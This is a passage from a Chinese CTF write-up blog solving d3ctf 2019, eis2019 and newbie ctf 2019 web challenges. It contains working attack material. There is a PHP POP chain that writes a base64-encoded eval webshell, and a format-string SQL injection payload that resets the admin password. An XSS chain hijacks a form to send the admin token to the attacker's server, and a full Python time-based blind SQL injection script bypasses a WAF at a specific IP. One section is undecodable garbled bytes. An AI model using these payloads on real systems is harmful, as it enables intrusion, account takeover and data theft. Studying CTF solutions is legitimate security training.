if (preg_match(&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;, $content)){            die(&#39;hacker!!!&#39;);        }        file_put_contents($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename,$content);    }    public function remove(){        $this-&gt;checkdir();        $this-&gt;checkext();        if (file_exists($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename)){            unlink($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename);        }    }    public function count($dir) {        if ($dir === &#39;&#39;){            $num = count(scandir($this-&gt;userdir)) - 2;        }        else {            $num = count(scandir($dir)) - 2;        }        if($num &gt; 0) {            return &quot;you have $num files&quot;;        }        else{            return &quot;you don&#39;t have file&quot;;        }    }    public function __toString() {        return implode(&quot; &quot;,scandir(__DIR__.&quot;/&quot;.$this-&gt;userdir));    }    public function __destruct() {        $string = &quot;your file in : &quot;.$this-&gt;userdir;        file_put_contents($this-&gt;filename.&quot;.txt&quot;, $string);        echo $string;    }}if (!isset($_POST[&#39;action&#39;]) || !isset($_POST[&#39;url&#39;]) || !isset($_POST[&#39;filename&#39;])){    highlight_file(__FILE__);    die();}$dir = new dir($_POST[&#39;url&#39;],$_POST[&#39;filename&#39;]);if($_POST[&#39;action&#39;] === &quot;upload&quot;) {    $dir-&gt;upload();}elseif ($_POST[&#39;action&#39;] === &quot;remove&quot;) {    $dir-&gt;remove();}elseif ($_POST[&#39;action&#39;] === &quot;count&quot;) {    if (!isset($_POST[&#39;dir&#39;])){        echo $dir-&gt;count(&#39;&#39;);    } else {        echo $dir-&gt;count($_POST[&#39;dir&#39;]);    }}</code></pre><blockquote><p>webroot in /var/www/html<br>Notice:scanner is useless<br>hint1: webroot changes every 10 mins<br>hint2: glob<br>hint3: <a href="https://www.php.net/manual/en/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/en/language.oop5.decon.php</a>  ** Pay attention to the notes in the article **</p></blockquote><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>upload处url可控,所以只要上传一个phar文件便可以反序列化</p><p>利用这个能做到:</p><ol><li>扫目录<code>__destruct__=&gt;__toString__</code></li><li>任意位置写文件,但是因为上传phar文件时有过滤,所以文件内容也有所限制</li></ol><p>但是</p><p><code>phar://phar.phar.gz/test.txt</code></p><p><code>将phar文件压缩后便可以绕过文件限制</code></p><p>于是我们就可以在任意位置写文件的权限了</p><p>于是我们有这样的思路:利用upload写一个htaccess,然后再利用反序列化写一个shell。</p><p>这里有个坑点就是，web主目录每隔10分钟变化一次,但是我们仍然可以利用反序列化来读取web目录</p><p>按照上述步骤成功拿到shell</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmy4tnlxj30ja05mglr.jpg" alt="image.png"></p><p>输入phpinfo()发现,有disable_function里禁用了system等函数,这就不爽了。但是php版本是7.2，上传</p><p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a>  这个老兄写的绕过disable_function的脚本，爽死了。</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmyvlo98j30ga03ywej.jpg" alt="image.png"></p><h3 id="showhub"><a href="#showhub" class="headerlink" title="showhub"></a>showhub</h3><p>阅读代码发现</p><pre><code class="php">public function register($username, $password)    {        $password = hash(&quot;sha256&quot;, $password);        $user = (new User(null, $username, $password))-&gt;save();        if ($user) {            $_SESSION[&#39;uid&#39;] = $user-&gt;id;            return $user;        }        return false;    }public function save()    {        $args = get_object_vars($this);        $args = array_slice($args, 0, -2);        if ($args[&#39;id&#39;] !== null) {            $baseSql = &quot;UPDATE `$this-&gt;tbname` SET %s WHERE id=&quot; . $args[&#39;id&#39;];            $sql = self::prepareUpdate($baseSql, array_slice($args, 1));            $this-&gt;db-&gt;query($sql);            if (!$this-&gt;db-&gt;conn-&gt;error) {                return $this;            } else {                return null;            }        } else {            $baseSql = &quot;INSERT INTO `$this-&gt;tbname`(%s) VALUE(%s)&quot;;            $sql = self::prepareInsert($baseSql, $args);            $this-&gt;db-&gt;query($sql);            if (!$this-&gt;db-&gt;conn-&gt;error) {                $objectID = $this-&gt;db-&gt;query(&quot;SELECT LAST_INSERT_ID()&quot;)-&gt;fetch_row()[0];                return self::findOne(array(&quot;id&quot; =&gt; $objectID));            } else {                return null;            }        }    }</code></pre><p>register调用的save方法存在格式化字符串漏洞可以绕过addslashes</p><p>构造<code>user=admin%1$&#39;,0x60)#&amp;pass=123</code></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9l4a1jb20j30l204cgls.jpg" alt="image.png"></p><p>insert 的一个方法可以修改重复的值  <code>insert on duplicate key update</code> ，它能够让我们在新插入的一个数据和原有数据发生重复时，修改原有数据。那么我们通过这个技巧修改管理员的密码即可。 </p><p>测试test用户,原密码:123</p><p>构造<code>user=test%1$&#39;,0x60)on duplicate key update password=0x38643936396565663665636164336332396133613632393238306536383663663063336635643561383661666633636131323032306339323361646336633932#&amp;pass=123</code></p><p>成功将密码修改为123456，冲admin密码</p><p>接着进入webconsole当中,提示只有内网才能使用</p><p>相关代码</p><pre><code class="php">if ($this-&gt;request-&gt;user-&gt;username === &quot;admin&quot; &amp;&amp; !filter_var(                $_SERVER[&#39;HTTP_CLIENT_IP&#39;],                FILTER_VALIDATE_IP,                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE            ))</code></pre><p>emmm直接修改cilent-ip发现不行</p><blockquote><p>因为这里的<code>Client-IP</code>头是反代层面设置的（set $Client-IP $remote_addr）, 所以无法通过前端修改请求头来伪造。 </p><p>这时可以从服务器返回的<code>Server</code>头中发现，反代是<code>ATS7.1.2</code> 那么应该很敏感的想到通过<code>HTTP走私</code> 来绕过反代，规避反代设置<code>Client-IP</code>。 </p></blockquote><p>那么什么是ast?</p><blockquote><p>Apache Traffic Server™ is a high-performance web proxy cache that improves network efficiency and performance by caching frequently-accessed information at the edge of the network. This brings content physically closer to end users, while enabling faster delivery and reduced bandwidth use. Traffic Server is designed to improve content delivery for enterprises, Internet service providers (ISPs), backbone providers, and large intranets by maximizing existing and available bandwidth. </p></blockquote><p>emmmm,ast是一个在用户和服务器之间的起缓冲加速的代理服务器,这也正是http走私常出现的应用场景</p><p><code>ATS7.1.2</code> 有个cve恰好是关于http走私的，直接用就ok了</p><h3 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h3><p>emmm,ctf的弥天大谎</p><pre><code class="python">from flask import Flask, render_template_string, session, request, make_responseimport hashlibimport osimport jsonfrom rq import Queuefrom redis import Redisapp = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = &#39;somesecret&#39;config = json.load(open(&#39;config.json&#39;, &#39;r&#39;))def verify_url(url):    base = &#39;https://&#39;+request.host    if len(url) == 0:        return False    if len(url) &lt; len(base) or url[:len(base)] != base:        return False    return Truedef verify_captcha(captcha):    return &#39;captcha&#39; in session.keys() \        and len(session.get(&#39;captcha&#39;)) == 5 \        and hashlib.md5(captcha.encode()).hexdigest()[:5] == session.get(&#39;captcha&#39;)def add_queue(url):    q = Queue(connection=Redis(        host=config[&#39;redis&#39;][&#39;host&#39;],        password=config[&#39;redis&#39;][&#39;auth&#39;]    ))    q.enqueue(&#39;bot.add&#39;, url)@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])@app.route(&#39;/index.php&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def index():    message = &quot;&quot;    if request.method == &#39;POST&#39;:        try:            if &#39;captcha&#39; in request.form.keys() and &#39;url&#39; in request.form.keys():                captcha = request.form[&#39;captcha&#39;]                url = request.form[&#39;url&#39;]                if not verify_captcha(captcha):                    message = &quot;Wrong Captcha :(&quot;                elif not verify_url(url):                    message = &quot;Wrong URL :(&quot;                else:                    session.pop(&#39;captcha&#39;)                    message = &quot;Done! Please wait for the admin to check it out. XD&quot;                    add_queue(url)        except:            message = &quot;Error! Please contact admin&quot;    if &#39;captcha&#39; not in request.form.keys() or &#39;captcha&#39; not in session.keys():        session[&#39;captcha&#39;] = hashlib.md5(os.urandom(16)).hexdigest()[:5]    return render_template_string(        index,        message=message,        host=&#39;https://&#39;+request.host,        captcha=session[&#39;captcha&#39;]    )@app.route(&#39;/fd.php&#39;)def mirror():    response = make_response(request.args.get(&#39;q&#39;))    response.headers[&#39;Content-Security-Policy&#39;] = &quot;img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;&quot;    return response@app.route(&#39;/admin.php&#39;)def admin():    if request.headers.get(&#39;x-forwarded-for&#39;) != config[&#39;redis&#39;][&#39;host&#39;]:        return &#39;only admin can see it&#39;    token = request.host.split(&#39;.&#39;)[0]    return f&#39;&#39;&#39;{{    "token": "{token}",    "flag": "d3ctf{{{hashlib.sha256((        token+config["challenge"]["flag"]    ).encode()).hexdigest()}}}&quot;}}&#39;&#39;&#39;</code></pre><p>关键代码:</p><pre><code class="python">if request.method == &#39;POST&#39;:        try:            if &#39;captcha&#39; in request.form.keys() and &#39;url&#39; in request.form.keys():                captcha = request.form[&#39;captcha&#39;]                url = request.form[&#39;url&#39;]                if not verify_captcha(captcha):                    message = &quot;Wrong Captcha :(&quot;                elif not verify_url(url):                    message = &quot;Wrong URL :(&quot;                else:                    session.pop(&#39;captcha&#39;)                    message = &quot;Done! Please wait for the admin to check it out. XD&quot;                    add_queue(url)        except:            message = &quot;Error! Please contact admin&quot;</code></pre><pre><code class="python">def verify_url(url):    base = &#39;https://&#39;+request.host    if len(url) == 0:        return False    if len(url) &lt; len(base) or url[:len(base)] != base:        return False    return True</code></pre><p>通过verify_url之后,admin便回访问.这里用<code>&#39;https://&#39;+request.host</code>来验证是否来源于原网站</p><p>emmm,request.host=<code>/fd.php</code>,就不用考虑修改host来绕过拉</p><p>那么就是要绕<code>/fd.php</code>的csp策略了:<code>img-src &#39;none&#39;; script-src &#39;none&#39;; frame-src &#39;none&#39;; connect-src &#39;none&#39;</code></p><p>真的是baby难度啊。。。。。</p><blockquote><p>丢到csp-evaluator里头可以发现没有设置object-src<br>object-src允许嵌入object<br>根据hint去<code>chrome://components</code>里头找有什么可以利用的组件<br>最新版chrome已经默认禁止了flash的使用(然而就是有很多人不信邪)<br>通过一些搜索可以发现pNaCl可以跑C/C++</p><p>可以编写一个Leak去请求admin.php，获取flag，然后再将flag带出来<br>下载下来谷歌的<a href="https://developers.google.com/native-client/dev/sdk/download" target="_blank" rel="noopener">SDK</a>和Leak后可以编译出一个nmf文件和一个pexe文件，放到自己的服务器上然后尝试:</p><pre><code class="html">&lt;embed src=&quot;http://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</code></pre><p>轻松获得了一个Mixed Content呢（（毒瘤出题人<br>上https以后发现:</p><pre><code>PNaCl modules can only be used on the open web (non-app/extension) when the PNaCl Origin Trial is enabled</code></pre><p>搜索Origin Trial，看新闻：</p><p><a href="https://developer.chrome.com/native-client/migration" target="_blank" rel="noopener">https://developer.chrome.com/native-client/migration</a><br><a href="https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md" target="_blank" rel="noopener">https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md</a></p><p>去<a href="https://developers.chrome.com/origintrials" target="_blank" rel="noopener">Origin Trial</a>申请一个token，最终的payload:</p><pre><code>&lt;meta http-equiv=&quot;origin-trial&quot; content=&quot;[token]&quot;&gt;&lt;embed src=&quot;https://server_url/url_loader.nmf&quot; type=&quot;application/x-pnacl&quot;&gt;</code></pre></blockquote><h3 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h3><p>自己搭的环境毛病一大堆///就直接看别人wp了</p><p>题目是一个在线留言板，注册登录后可以提交留言。</p><p>简单测试后会发现留言可以插入 HTML 标签，但是后端使用了标签名/属性名白名单做过滤，一般的危险标签和属性都被 ban 掉了。</p><p>控制台可以看到打包前的前端源码，审计一波。</p><p>第一个问题，CSRF token 是直接使用的 sessionid :</p><p><a href="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/78572404b4f302815535605f49e47477df47f136/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f674f73476c66557a5a41767848434d2e706e67" alt="img"></a></p><p>因此如果我们能获得他人的 token 就可以登录他人账号。</p><p>第二个问题，我们传入的参数 this.$route.query.did 被拼接到了 jsonp 方法的 url 当中</p><p><a href="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/37614f78f54c402a09ef0efb3bdc891ee76697be/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f54627a6e38726741743453354568322e706e67" alt="img"></a></p><p>因此我们可以设置 did 为 <code>1/delete?callback=alert#</code> ，控制 jsonp 的 callback ，在 jsonp 方法中会直接执行：</p><p><a href="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/b44851e6b9409b003729254870ebe56c33a0023d/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f32346958784f774b4d4979685551362e706e67" alt="img"></a></p><p>但是后端的 jsonp api 给 callback 做了校验，只能传入有限的字符，并不能任意执行 js 代码。</p><p><a href="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/c9d4940ee30bed9d3d348a23c5ef124647fce4e8/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f74514e6a44703138434b6e32376b642e706e67" alt="img"></a></p><p>所以我们需要把这两个问题结合利用一下，利用这个受限的 jsonp xss 来劫持 token 。</p><p><a href="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/fb13e5fdc26601fe743c654637ce47d4654b8de9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f795a5769367348503252397a3344312e706e67" alt="img"></a></p><p>我们可以看到 token 被渲染到了 id 为 messageForm 的 form 中，所以我们可以尝试劫持这个 form ，让他的 submit 后提交到我们的服务器，从而获取 token 。</p><p>如何劫持呢？利用两个 HTML5 的有趣属性：</p><blockquote><p><a href="https://www.w3school.com.cn/tags/att_input_formaction.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/att_input_formaction.asp</a></p><p><a href="https://www.w3school.com.cn/tags/att_input_form.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/att_input_form.asp</a></p></blockquote><p>我们可以利用留言功能插入一个在表单之外的 input 标签，再利用这两个属性来劫持表单：</p><p><a href="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/7c7d13633a5d667951eb89bc40a16176ca12ddb7/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f35544b66655745706958554c4d79612e706e67" alt="img"></a></p><p>利用 jsonp xss 来点击它：</p><pre><code>http://localhost:8180/#/?pid=72&amp;did=23%2Fdelete%3Fcallback%3Dfish.click%23</code></pre><p>token 就到手了：</p><p><a href="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/ff79d0d683a4390d754c37675bc300da483a31e9/68747470733a2f2f692e6c6f6c692e6e65742f323031392f31302f32322f576f7544666b724277684c415837502e706e67" alt="img"></a></p><p>report 这条 payload ，获得 admin 的 token 之后登录 admin 账号，在 admin 的留言中获得 flag 。</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="c-c"><a href="#c-c" class="headerlink" title="c+c"></a>c+c</h3><p>readme.txt</p><blockquote><p>This is a lite (which means there is no voice but the script is complete.) version of a great galgame (a.k.a. Visual Novel) written by Romeo Tanaka. Hope you enjoy it.<br>PS: I did some small hack to the game for cracking. But you still need steam running to play this game.<br>PSS: If you like it, you can buy it on steam.<br>PSSS: Do not forget to find the flag. And the flag is just in THIS file.</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976rzdu69j30j001aglt.jpg" alt="image.png"></p><p>游戏中会出现</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g976tjarq4j308k01nt8n.jpg" alt="image.png"></p><p>一些不可见字符8个以上,可能是flag?</p><pre><code class="lua">function L0_0()  local L0_32, L1_33, L2_34, L3_35  L0_32 = {    L1_33,    L2_34,    L3_35,    172,    21,    149,    198,    139,    38,    63,    174,    238,    232,    20,    85,    107  }  L1_33 = 221  L2_34 = 179  L3_35 = 102  L1_33 = 166  L2_34 = 44  L3_35 = &quot;{&quot;  for _FORV_7_ = 1, #L0_32 do    L3_35 = L3_35 .. string.format(&quot;%02x&quot;, L0_32[_FORV_7_] ~ L1_33)    if _FORV_7_ == 4 or _FORV_7_ == 6 or _FORV_7_ == 8 or _FORV_7_ == 10 then      L3_35 = L3_35 .. &quot;-&quot;    end  end  L3_35 = L3_35 .. &quot;}&quot;  return &quot;&quot;, &quot;&quot;, string.upper(L3_35), L2_34end</code></pre><p>su直接去买了原版游戏，对比发现只有dll，exe文件不同</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97whcjur2j31ya0poq7p.jpg" alt="image.png"></p><p>阵亡</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/d3ctf2019/">https://www.ccreater.top/2020/04/20/d3ctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>eis2019</title>
      <link href="2020/04/20/eis2019/"/>
      <url>2020/04/20/eis2019/</url>
      
        <content type="html"><![CDATA[<h1 id="eis2019"><a href="#eis2019" class="headerlink" title="eis2019"></a>eis2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>upload:</p><p>校验文件头</p><p>过滤后缀php</p><p>上传php5后缀绕过</p><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p><pre><code class="php">&lt;?phperror_reporting(0);class A{    protected $store;    protected $key;    protected $expire;    public function __construct($store, $key = &#39;flysystem&#39;, $expire = null)    {        $this-&gt;key    = $key;        $this-&gt;store  = $store;        $this-&gt;expire = $expire;    }    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }    public function getForStorage()    {        $cleaned = $this-&gt;cleanContents($this-&gt;cache);        return json_encode([$cleaned, $this-&gt;complete]);    }    public function save()    {        $contents = $this-&gt;getForStorage();        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);    }    public function __destruct()    {        if (! $this-&gt;autosave) {            $this-&gt;save();        }    }}class B{    protected function getExpireTime($expire): int    {        return (int) $expire;    }    public function getCacheKey(string $name): string    {        return $this-&gt;options[&#39;prefix&#39;] . $name;    }    protected function serialize($data): string    {        if (is_numeric($data)) {            return (string) $data;        }        $serialize = $this-&gt;options[&#39;serialize&#39;];        return $serialize($data);    }    public function set($name, $value, $expire = null): bool    {        $this-&gt;writeTimes++;        if (is_null($expire)) {            $expire = $this-&gt;options[&#39;expire&#39;];        }        $expire   = $this-&gt;getExpireTime($expire);        $filename = $this-&gt;getCacheKey($name);        $dir = dirname($filename);        if (!is_dir($dir)) {            try {                mkdir($dir, 0755, true);            } catch (\Exception $e) {                // 创建失败            }        }        $data = $this-&gt;serialize($value);        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {            //数据压缩            $data = gzcompress($data, 3);        }        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;        $result = file_put_contents($filename, $data);        if ($result) {            return true;        }        return false;    }}if (isset($_GET[&#39;src&#39;])){    highlight_file(__FILE__);}$dir = &quot;uploads/&quot;;if (!is_dir($dir)){    mkdir($dir);}unserialize($_GET[&quot;data&quot;]);</code></pre><p>这里有一个上传点</p><pre><code class="php">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;$result = file_put_contents($filename, $data);</code></pre><p>但是这里有个死亡exit</p><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p><p>这里文件名可控,我们用php协议编码exit从而绕过死亡exit</p><p>构造</p><pre><code class="php">&lt;?phpclass A{    protected $store;    protected $key;    protected $expire;    public $autosave=FALSE;    public $complete;    public $cache;    public function __construct()    {        $this-&gt;key    = &quot;fffffuck.php&quot;;        $this-&gt;store=new B;        $this-&gt;expire = $expire;        $this-&gt;complete=&quot;PD9waHAgZXZhbCgkX1BPU1RbImEiXSk7ID8+&quot;;        $this-&gt;cache=array();    }}class B{    public $options;    public $writeTimes;    public function __construct()    {        $this-&gt;options=array(            &#39;expire&#39;=&gt;&#39;0&#39;,            &quot;prefix&quot;=&gt;&#39;php://filter/write=convert.base64-decode/resource=uploads/&#39;,            &#39;serialize&#39;=&gt;&#39;serialize&#39;,            &#39;data_compress&#39;=&gt;FALSE        );    }}print(urlencode(serialize(new A)));?&gt;</code></pre><h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a> </p><p>利用这个绕过</p><h3 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h3><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;if (isset($_GET[&#39;src&#39;])){    highlight_file(__FILE__);}function escape($arr){    global $mysqli;    $newarr = array();    foreach($arr as $key=&gt;$val)    {        if (!is_array($val))        {            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);        }    }    return $newarr;}$_GET= escape($_GET);if (isset($_GET[&#39;name&#39;])){    $name = $_GET[&#39;name&#39;];    mysqli_query($mysqli, &quot;select age from user where name=&#39;$name&#39;&quot;);}else if(isset($_GET[&#39;age&#39;])){    $age = $_GET[&#39;age&#39;];    mysqli_query($mysqli, &quot;select name from user where age=$age&quot;);}</code></pre><p>选择age作为注入点，不需要逃逸引号,没有回显利用时间盲注</p><p><code>?age=1%2bsleep(1)</code> =&gt; 403</p><p>apache设置了waf</p><p>用畸形的http绕过waf</p><pre><code class="python">import requestsimport hackhttp import urllibimport socketip = &#39;111.186.57.61&#39;port = 10601def send_raw(raw):    try:        with socket.create_connection((ip, port), timeout=2) as conn:            conn.send(bytes(raw,encoding=&quot;ascii&quot;))            res = conn.recv(10240).decode()    except:        return True    return Falsedef rawhttp(sql):    sql=urllib.parse.quote(sql)    burp0_url = &quot;http://111.186.57.61:10601/?age={}&quot;.format(sql)    raw=&#39;&#39;&#39;GET /?age={} HTTP/1.1Host: 111.186.57.61:10601Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Length: 0Content-Length: 0&#39;&#39;&#39;.format(sql).replace(&quot;\n&quot;,&quot;\r\n&quot;)    return send_raw(raw)l=&#39;0123456789ABCDEF&#39;result=&quot;657A73716C69&quot;#database :ezsqliresult=&quot;&quot;#table flag_xdd,user?#column flag_32122#flag{bypass_modsecurity_a202e614489c}j=len(result)while True:    for i in l:        sql=&quot;if((select substr(hex(GROUP_CONCAT(flag_32122)),{},1) FROM flag_xdd)=char({}),sleep(10),0)&quot;.format(j+1,ord(i))        if rawhttp(sql):            result+=i            print(result)            break        else :            print(&quot;第{}个字符不是{}&quot;.format(j+1,i))    j+=1</code></pre><h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>莫得</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="two-cat"><a href="#two-cat" class="headerlink" title="two_cat"></a>two_cat</h3><p>看别人的wp知道是盲水印攻击</p><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc 1"></a>misc 1</h2><pre><code>I¤Ìçz6j|´±¥ó¼¹[ƂĄʃz@ałޢ|ӄɒak@ałޢŅyĉӡk@ałޒ|ӄɒak@֋@JBťɁÉ֕k@ŧÅՄń@Ձ٨@ÖąŀąÉԁԀɕÅكȁՇƀÖąZ@U@SӅǅŀÈYCÅڀĀĢń@֕@ʂՀĉՖęË@ɣ@ŧɢâ@ɕ@c@ӅbĀȀԤäSӨ@ɕÖԗcɂӅ@Ņ٢ɖբk@SԀƅcęɕȀ¤È@ąӉǈâ@b@Ֆ֠ÖգɇĖĢ@Ӆãř@ؤŕÅÀUŀÈƀBՃƀֆ@ŅفԀ¢ĉʀפՃäcɖրÈYCÅ٢@ƁəӨ@ɔז٣UĀƖڀԖąٕ@Öԗģř@ӁՇāǅÀMŧCÓɀƈɃɀÈYCÅ٢@YƀBգ@ŁىŢ@CÖلɕȀÖ@ƈɃɀŅ٢ɖրֆ@ƂĄʃ@ȖŽم@Ӗ֒ɕȀc]K@ʂՀDWÅŀƂĄʃ@ƙ֔@פՃȅŀÁل@Öą@ɕ@ÈƀŁٓɀ񹶰ÀUŀי֔ēǁÅŀɣ@b@ä£֔ř`ÖգٖԀÁãɃ@MƀÖՕŃÖڀÖբ׉فè]k@ęՉՇ@ÈƀSمDɀŢÁɢȅŀ¢ĉʀ£UāلK@㖄hk@ʂՀÓIԢ@Ö@@U@֗ŕ`¨£ŔÀÖԗUɫ@¤ĀʂսÀ֦րąىףɖրֆ@ÈƀƂĄʃ@ŁىUâ@UŀȖǀÖ@ÖեřĀæŅրÈŔ@ɢ@£ɓԀɕÅٕSӨ@ÓbƉń@ÖؠÙţk@¤ٕ`Ɩم`مDɕȋ@ȁÒřÀUÈ@c@ÈƀŅ٨@Ձԅ@ֆ@ƂĄʃ@UŀÖբɄř@ɣ@ԁՉƅ£cɖրֆ@פم£@ťɓKƓG@ɢ@ƓGp°��ƴ����򴄴𰲳ǰƄÅ�</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/eis2019/">https://www.ccreater.top/2020/04/20/eis2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>newbie ctf 2019</title>
      <link href="2020/04/20/nbctf/"/>
      <url>2020/04/20/nbctf/</url>
      
        <content type="html"><![CDATA[<h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>题目描述:</p><blockquote><p>You can get flag in “normalflag.iwinv.net”</p></blockquote><p>题目给的链接</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p><p>直接访问 flag</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p><p>输入网站测试发现,会在网址后面加个secret参数</p><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191103111420354.png" 